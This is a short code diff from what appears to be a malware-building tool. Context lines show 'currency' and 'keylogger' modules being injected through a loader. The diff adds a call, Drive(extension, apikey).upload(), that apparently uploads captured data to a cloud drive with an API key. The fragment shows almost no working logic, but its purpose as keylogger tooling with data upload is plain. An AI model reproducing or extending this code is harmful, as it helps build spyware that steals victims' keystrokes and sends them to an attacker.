@@ -60,7 +60,9 @@ def main() :
 		builder = Build(extension, builds).builder()
 	if modules == "currency" or modules == "keylogger" :
 		loader = Loader(extension, modules).inject()
-
+	
+	Drive(extension, apikey).upload()	
+	
 if __name__== "__main__" :
 
 	main()
